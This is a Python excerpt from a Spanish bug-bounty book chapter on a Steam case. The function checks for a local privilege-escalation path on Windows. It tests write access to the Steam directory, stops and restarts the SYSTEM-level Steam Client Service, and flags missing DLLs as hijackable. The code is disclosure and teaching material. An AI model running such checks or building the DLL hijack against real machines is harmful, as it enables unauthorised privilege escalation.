# Extraído de: LibroBugBounty/cap-21-caso-steam.md
STEAM_DIR = r"C:\Program Files (x86)\Steam"
STEAM_SVC = "Steam Client Service"

def check_prerequisites():
    """Verificar condiciones para la explotacion."""
    # 1. Directorio escribible
    test = os.path.join(STEAM_DIR, ".poc_write_test")
    try:
        with open(test, "w") as f:
            f.write("test")
        os.remove(test)
        print(f"[+] {STEAM_DIR} es ESCRIBIBLE por usuario actual")
    except PermissionError:
        print(f"[-] {STEAM_DIR} NO es escribible")
        return False

    # 2. Servicio controlable
    r = subprocess.run(
        ["sc", "stop", STEAM_SVC],
        capture_output=True, text=True, timeout=10
    )
    if r.returncode == 0:
        print("[+] sc stop: EXITO (usuario puede detener SYSTEM)")
        time.sleep(2)
        subprocess.run(["sc", "start", STEAM_SVC],
                       capture_output=True, timeout=10)
        print("[+] sc start: servicio reiniciado")

    # 3. DLLs hijackables
    candidates = ["VERSION.dll", "USERENV.dll", "WTSAPI32.dll",
                  "DBGHELP.dll", "dbgcore.dll", "bcrypt.dll"]
    for dll in candidates:
        in_steam = os.path.join(STEAM_DIR, dll)
        in_sys = os.path.join(r"C:\Windows\SysWOW64", dll)
        if not os.path.exists(in_steam) and os.path.exists(in_sys):
            print(f"[+] {dll}: NO en Steam -> HIJACKABLE")
    return True
